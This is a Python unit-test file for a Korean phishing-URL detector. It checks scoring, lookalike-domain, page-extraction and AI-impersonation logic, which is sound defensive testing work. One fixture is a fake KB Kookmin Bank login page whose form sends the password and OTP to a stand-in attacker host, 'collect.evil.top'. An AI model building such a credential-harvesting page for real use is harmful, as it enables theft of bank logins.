"""검사 로직 단위 테스트 (네트워크 사용 안 함).  실행: .venv\\Scripts\\python -m pytest"""
import cv2

from app.analyzer import ai_signal, analyze, url_structure_signals
from app.brand import brands_in_text, find_brand, find_lookalike
from app.page import extract
from app.qr_decode import decode_image
from app.scoring import make_signal, score


# ---------- 점수 계산 ----------
def test_weak_signals_only_reach_caution_at_most():
    weak = [make_signal(s, "") for s in ("http", "long_url", "many_subdomains", "encoded_chars", "at_symbol", "punycode",
                                            "suspicious_tld", "form_posts_elsewhere", "hosting_platform")]
    r = score(weak)
    assert r["breakdown"]["weak"] == r["breakdown"]["weak_cap"]  # 상한 적용
    assert r["verdict"] == "caution"


def test_confirmed_signal_is_danger_even_with_safe_signals():
    r = score([make_signal("phishing_db", ""), make_signal("trusted_site", ""), make_signal("valid_cert", "")])
    assert r["verdict"] == "danger"


def test_combo_rule_http_with_sensitive_form():
    r = score([make_signal("http", ""), make_signal("sensitive_form", "")])
    assert any(x["id"] == "http_sensitive_form" for x in r["risk_reasons"])


def test_http_without_form_stays_weak():
    r = score([make_signal("http", "")])
    assert r["verdict"] == "safe"


def test_safe_signals_reduce_score():
    r = score([make_signal("brand_lookalike", ""), make_signal("valid_cert", "")])
    assert r["score"] == 35 - 5


# ---------- URL 구조 ----------
def test_url_structure_signals():
    ids = {s["id"] for s in url_structure_signals("http://user@login.secure.verify.account.example.xyz/a?" + "&".join(f"p{i}=1" for i in range(8)))}
    assert {"at_symbol", "many_subdomains", "many_params", "suspicious_tld"} <= ids


# ---------- 브랜드 유사 도메인 ----------
def test_lookalike_typo():
    assert find_lookalike("navver.com")["brand"]["id"] == "naver"
    assert find_lookalike("www.kbstar-login.xyz")["brand"]["id"] == "kbstar"
    assert find_lookalike("naver.com.secure-check.top")["brand"]["id"] == "naver"


def test_official_domain_is_not_lookalike():
    assert find_lookalike("nid.naver.com") is None
    assert find_lookalike("www.kbstar.com") is None
    assert find_lookalike("example.com") is None
    assert find_lookalike("contoso.sharepoint.com") is None  # 회사 쉐어포인트는 유사 도메인이 아님


# ---------- 브랜드 이름 매칭 (짧은 이름·일반 단어 오탐 방지) ----------
def test_brand_names_in_title():
    assert brands_in_text("다음 단계로 진행 - 토스트 주문") == []
    assert [b["id"] for b in brands_in_text("[우체국택배] 주소 확인")] == ["epost"]
    assert [b["id"] for b in brands_in_text("토스 로그인")] == ["toss"]


def test_find_brand_from_ai_name():
    assert find_brand("Groups Inc") is None  # 'ups' 가 들어 있어도 UPS 아님
    assert find_brand("KB국민은행")["id"] == "kbstar"
    assert find_brand("Microsoft 365")["id"] == "microsoft"


# ---------- 페이지 추출 ----------
LOGIN_HTML = """<html><head><title>KB국민은행 인터넷뱅킹</title></head><body>
<form action="https://collect.evil.top/send.php"><input name="userid"><input type="password" name="pw">
<input name="otp" placeholder="OTP 인증번호"></form><img src="/img/kb_logo.png" alt="KB국민은행"></body></html>"""


def test_extract_sensitive_fields_and_external_action():
    page = extract(LOGIN_HTML, "https://kb-secure.example.com/login")
    assert set(page["sensitive_info"]) == {"비밀번호", "인증번호/OTP"}
    assert page["external_form_domains"] == ["evil.top"]
    assert page["title"] == "KB국민은행 인터넷뱅킹"


# ---------- 분석 파이프라인 (저장본 형식) ----------
def fake_snapshot(url, html, created="2026-11-01T00:00:00Z"):
    return {
        "url": url, "collected_at": "2026-11-04T00:00:00+00:00", "source": "test", "label": None, "html": html,
        "trace": {"input_url": url, "chain": [{"url": url, "status": 200}], "final_url": url, "status": 200,
                  "headers": {}, "content_type": "text/html", "is_download": False, "html_truncated": False, "error": None},
        "domain": {"checked": True, "domain": "", "created": created, "error": None},
        "cert": {"checked": False, "valid": None, "kind": None, "error": "https 아님"},
        "safe_browsing": {"checked": True, "matches": [], "error": None},
        "phish_feed": {"checked": True, "matches": [], "error": None},
    }


def test_analyze_phishing_like_page_is_danger():
    r = analyze(fake_snapshot("http://kbstar-login.xyz/", LOGIN_HTML), use_ai=False)
    ids = {x["id"] for x in r["risk_reasons"]}
    assert {"new_domain", "brand_lookalike", "brand_form_mismatch", "http_sensitive_form"} <= ids
    assert r["verdict"] == "danger"
    assert r["notices"] == []  # http는 점수 신호로만 표시 (주의사항 중복 없음)


def test_analyze_download_is_strong_signal():
    # 도메인 나이를 모르는 곳의 apk는 단독으로 '경고' (40점)
    snap = fake_snapshot("https://dl.apkfiles-test.net/app.apk", "", created=None)
    snap["trace"]["is_download"] = True
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "caution"
    assert [x["id"] for x in r["risk_reasons"]] == ["download"]
    assert r["notices"] == []
    assert r["summary"] == "앱 설치 경고"

    # 강한 신호(IP 주소 접속)와 겹치면 '위험' (40 + 35 + http 8)
    snap = fake_snapshot("http://123.45.67.89/app.apk", "", created=None)
    snap["trace"]["is_download"] = True
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "danger" and r["summary"] == "앱 설치 위험"

    # 오래된 도메인이어도 감점이 없으므로 정상 인증서만 빼고 40 - 5 = 35 → '경고'
    snap = fake_snapshot("https://dl.apkfiles-test.net/app.apk", "", created="2010-01-01T00:00:00Z")
    snap["trace"]["is_download"] = True
    snap["cert"] = {"checked": True, "valid": True, "kind": None, "error": None}
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "caution" and r["top_rule"]["id"] == "app_install"

    # 신뢰 사이트(example.org)의 실행 파일은 점수상 안전이지만 설치 안내는 보여 준다
    snap = fake_snapshot("https://files.example.org/app.apk", "", created="2010-01-01T00:00:00Z")
    snap["trace"]["is_download"] = True
    snap["cert"] = {"checked": True, "valid": True, "kind": None, "error": None}
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "safe" and r["top_rule"]["id"] == "app_install" and "설치" in r["action"]


def test_hosting_alone_is_safe_but_sensitive_form_combo_raises():
    assert score([make_signal("hosting_platform", "")])["verdict"] == "safe"
    r = score([make_signal("hosting_platform", ""), make_signal("sensitive_form", "")])
    assert r["verdict"] == "caution" and r["score"] == 10 + 35


def test_ai_impersonation_alone_is_caution():
    assert score([make_signal("ai_impersonation", "")])["verdict"] == "caution"


def test_new_domain_alone_is_safe_but_combo_raises():
    assert score([make_signal("new_domain", "")])["verdict"] == "safe"
    r = score([make_signal("new_domain", ""), make_signal("brand_lookalike", "")])
    assert r["verdict"] == "danger" and r["score"] == 10 + 35 + 35
    r = score([make_signal("new_domain", ""), make_signal("shortener_cross_domain", "")])
    assert r["verdict"] == "danger" and r["score"] == 10 + 20 + 35


def test_malware_db_escalates_to_danger():
    snap = fake_snapshot("https://example.org/", "<title>hi</title>", created="2010-01-01T00:00:00Z")
    snap["safe_browsing"]["matches"] = [{"url": "https://example.org/", "threat_type": "MALWARE"}]
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "danger"
    # 피싱 판정과 문구는 악성코드와 섞이지 않아야 한다.
    assert r["phishing_verdict"] == "safe"
    assert r["headline"]["kind"] == "악성코드"
    assert "피싱 사이트일 가능성" not in r["headline"]["message"]
    assert all(x["id"] != "malware_db" for x in r["risk_reasons"])


# ---------- AI 결과 반영 ----------
def test_ai_impersonation_signal():
    ai = {"claimed_service": "국민은행", "page_purpose": "로그인", "requested_info": ["비밀번호", "인증번호/OTP"],
          "official_domain_guess": "kbstar.com", "confidence": 0.9, "reason": ""}
    sig, _ = ai_signal(ai, "kb-secure.example.com")
    assert sig["id"] == "ai_impersonation"
    assert ai_signal(ai, "obank.kbstar.com")[0] is None  # 공식 도메인이면 신호 없음
    # 목록에 있는 브랜드는 AI가 '운영 주체 도메인'이라고 해도 공식 목록으로만 판단한다.
    assert ai_signal({**ai, "domain_matches_service": True}, "kb-secure.example.com")[0]["id"] == "ai_impersonation"


def test_ai_unknown_brand_owned_domain_is_not_impersonation():
    # 브랜드 목록에 없는 회사가 대표 도메인이 아닌 자기 도메인(테스트 사이트 등)을 쓰는 경우
    ai = {"claimed_service": "Acunetix", "page_purpose": "취약점 테스트용 로그인 페이지", "requested_info": ["비밀번호"],
          "official_domain_guess": "acunetix.com", "domain_matches_service": True, "confidence": 1.0, "reason": ""}
    assert ai_signal(ai, "testaspnet.vulnweb.com")[0] is None
    assert ai_signal({**ai, "domain_matches_service": False}, "testaspnet.vulnweb.com")[0]["id"] == "ai_impersonation"
    # AI가 판단하지 못하면(null) 약한 신호로만
    assert ai_signal({**ai, "domain_matches_service": None}, "testaspnet.vulnweb.com")[0]["id"] == "ai_brand_claim"


# ---------- QR 해독 ----------
def test_qr_decode_roundtrip():
    qr = cv2.QRCodeEncoder.create().encode("https://example.com/pay")
    qr = cv2.resize(qr, None, fx=8, fy=8, interpolation=cv2.INTER_NEAREST)
    qr = cv2.copyMakeBorder(qr, 40, 40, 40, 40, cv2.BORDER_CONSTANT, value=255)
    ok, png = cv2.imencode(".png", qr)
    assert decode_image(png.tobytes()) == ["https://example.com/pay"]


# ---------- 판정 위계 (config/rules_hierarchy.json) ----------
from app import hierarchy  # noqa: E402


def test_every_signal_is_mapped_to_one_principle():
    assert hierarchy.mapping_problems() == []


def test_hierarchy_top_is_crime_type():
    r = analyze(fake_snapshot("http://kbstar-login.xyz/", LOGIN_HTML), use_ai=False)
    assert r["crime_type"]["id"] == "phishing"
    # 위험 근거 중 영향이 가장 큰 것이 속한 수칙이 대표 수칙
    assert r["top_rule"]["id"] == "personal_info"  # brand_form_mismatch(40점)
    cats = {c["id"]: c for c in r["report"]}
    checks = {k["id"]: k for c in r["report"] for s in c["sections"] for k in s["checks"]}
    # 대분류: 짧은 이름, 하위 항목 중 가장 나쁜 결과
    assert cats["official_address"]["short"] == "주소 확인"
    assert cats["official_address"]["status"] == "danger" and cats["personal_info"]["status"] == "danger"
    assert cats["app_install"]["status"] == "safe" and cats["qr_source"]["status"] == "phase2"
    # 검사 항목: 걸린 신호는 위험/경고, 검사했는데 없으면 안전, 검사를 못 하면 해당 없음
    assert checks["brand_lookalike"]["status"] == "danger"
    assert checks["tld"]["status"] == "caution"
    assert checks["ip_host"]["status"] == "safe"
    assert checks["shortener"]["status"] == "na"
    assert checks["ai_impersonation"]["status"] == "na" and checks["ai_impersonation"]["summary"] == "AI 분석 꺼짐"
    assert checks["cert"]["status"] == "na"  # http라 해당 없음
    # http 는 점수 신호로 한 번만 나오고, 조합 규칙은 원래 신호의 검사 항목 안에 들어간다
    assert [i["id"] for i in checks["https"]["items"]] == ["http", "http_sensitive_form"]
    assert [i["id"] for i in checks["domain_age"]["items"]] == ["new_domain", "new_domain_brand"]
    assert "http_form" not in checks and "new_domain_brand" not in checks
    assert r["risk_display"]["value"] == 100 and r["score"] > 100  # 화면 표시는 100점 상한


def test_verdict_label_caution_is_warning():
    r = score([make_signal("brand_lookalike", "")])
    assert r["verdict"] == "caution"
    from app.scoring import VERDICT_LABEL
    assert VERDICT_LABEL["caution"] == "경고"


def test_hierarchy_download_and_malware():
    snap = fake_snapshot("https://dl.apkfiles-test.net/app.apk", "", created=None)
    snap["trace"]["is_download"] = True
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "caution" and r["top_rule"]["id"] == "app_install"
    assert "설치" in r["action"]

    snap = fake_snapshot("https://example.org/", "<title>hi</title>", created="2010-01-01T00:00:00Z")
    snap["safe_browsing"]["matches"] = [{"url": "https://example.org/", "threat_type": "MALWARE"}]
    r = analyze(snap, use_ai=False)
    assert r["top_rule"]["id"] == "app_install"


def test_hierarchy_safe_has_no_top_rule():
    snap = fake_snapshot("https://example.org/", "<title>hi</title>", created="2010-01-01T00:00:00Z")
    snap["cert"] = {"checked": True, "valid": True, "kind": None, "error": None}
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "safe" and r["top_rule"] is None
    safe = next(c for c in r["report"] if c["id"] == "safe_evidence")
    found = {k["id"] for s in safe["sections"] for k in s["checks"] if k["status"] == "safe"}
    assert found >= {"valid_cert"}
    assert r["risk_display"]["value"] == r["score"]


# ---------- AI URL 캐시 (네트워크 사용 안 함) ----------
def test_ai_url_cache_returns_same_result(tmp_path, monkeypatch):
    import json
    import time
    from app import ai_judge, config
    monkeypatch.setattr(config, "DATA_DIR", tmp_path)
    model = config.settings()["ai"]["model"]
    result = {"claimed_service": None, "page_purpose": "테스트", "requested_info": [], "official_domain_guess": None,
              "domain_matches_service": None, "confidence": 0.1, "reason": ""}
    ai_judge._write_url_cache("https://example.net/a", model, result)
    # 페이지 내용이 달라도 같은 URL이면 저장된 결과를 그대로 쓴다 (API 호출 없음)
    r = ai_judge.judge_page({"title": "바뀐 내용"}, "example.net", url="https://example.net/a")
    assert r["status"] == "ok" and r["cached"] and r["result"] == result
    # 유효 시간이 지나면 쓰지 않는다
    path = ai_judge._url_cache_path("https://example.net/a", model)
    saved = json.loads(path.read_text(encoding="utf-8"))
    saved["saved_at"] = time.time() - 10 * 24 * 3600
    path.write_text(json.dumps(saved), encoding="utf-8")
    assert ai_judge._read_url_cache("https://example.net/a", model) is None


# ---------- 중복 묶음: 규칙·AI가 같은 사칭을 함께 잡으면 점수는 한 번만 ----------
def test_impersonation_overlap_counts_once():
    r = score([make_signal("brand_form_mismatch", "규칙"), make_signal("ai_impersonation", "AI")])
    assert r["score"] == 40
    pts = {s["id"]: s["points"] for s in r["risk_reasons"]}
    assert sorted(pts.values()) == [0, 40]
    # 하나만 걸리면 그대로 반영
    assert score([make_signal("brand_form_mismatch", "")])["score"] == 40


def test_ai_principle_is_separate_category():
    from app import hierarchy
    ids = [p["id"] for p in hierarchy.crime_type()["principles"]]
    assert ids[0] == "ai_analysis"
    assert hierarchy.mapping_problems() == []


def test_ai_brand_mismatch_when_ai_is_sure():
    # 민감 정보 요구는 없지만 AI가 '운영 주체 아님'을 확신 → 강한 신호 35점(정상 인증서 −5를 받아도 단독 경고)
    ai = {"claimed_service": "Ledger", "page_purpose": "지갑 업데이트 안내", "requested_info": [],
          "official_domain_guess": "ledger.com", "domain_matches_service": False, "confidence": 0.9, "reason": ""}
    sig, _ = ai_signal(ai, "ledger-update.example.net")
    assert sig["id"] == "ai_brand_mismatch"
    assert score([sig])["verdict"] == "caution"
    # AI 확신이 부족하거나 운영 주체 여부를 모르면 약한 신호(10점)로만
    assert ai_signal({**ai, "confidence": 0.7}, "ledger-update.example.net")[0]["id"] == "ai_brand_claim"
    assert ai_signal({**ai, "domain_matches_service": None}, "ledger-update.example.net")[0]["id"] == "ai_brand_claim"
    assert score([sig, make_signal("valid_cert", "")])["verdict"] == "caution"
    # 무료 호스팅과 겹쳐도 10 + 35 = 45 → 경고 (위험은 아님)
    r = score([make_signal("hosting_platform", ""), sig])
    assert r["verdict"] == "caution" and r["score"] == 45


def test_safe_levels_split_display_only():
    from app.analyzer import safe_level, headline
    th = {"check": 15, "caution": 30, "danger": 60}
    assert [safe_level(s, th) for s in (0, 1, 14, 15, 29)] == ["none", "minor", "minor", "check", "check"]
    assert headline("safe", False, 0, level="check")["message"].startswith("피싱 근거는 부족")
    # 판정 자체는 '안전'으로 유지되고 화면 라벨만 바뀐다
    snap = fake_snapshot("https://example.org/", "<title>hi</title>", created="2010-01-01T00:00:00Z")
    snap["cert"] = {"checked": True, "valid": True, "kind": None, "error": None}
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "safe" and r["safe_level"] == "none" and r["verdict_label"] == "정황 없음"
